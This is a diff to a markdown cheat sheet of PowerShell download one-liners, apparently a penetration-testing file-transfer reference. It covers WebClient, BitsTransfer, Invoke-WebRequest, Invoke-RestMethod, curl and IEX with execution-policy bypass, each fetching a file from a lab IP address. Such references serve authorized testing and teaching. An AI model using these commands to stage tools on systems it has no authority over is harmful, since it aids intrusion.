@@ -3,21 +3,14 @@ USING POWERSHELL -
 
 
 #### 
-**Web Content Download**
-	
-    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')
-
-**Powershell BitsTransfer**
-
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"
 
 **Web Content Download**
 	
     $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')
 
-**Powershell Direct URI**
+**Web Content Download**
 	
-    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt
+    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')
 
 **Web Content Download**
 	
@@ -27,6 +20,14 @@ USING POWERSHELL -
 	
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
 
+**Web Content Download**
+	
+    powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+
+**Web Content Download**
+	
+    powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+   
 **Powershell IEX**
 
     echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
@@ -37,15 +38,15 @@ USING POWERSHELL -
 
 **Powershell Curl**
 	
-    powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"	
+    powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"
 
-**Web Content Download**
+**Powershell Direct URI**
 	
-    powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt
 
-**Web Content Download**
-	
-    powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+**Powershell BitsTransfer**
+
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"
 
 **Using file**
 	
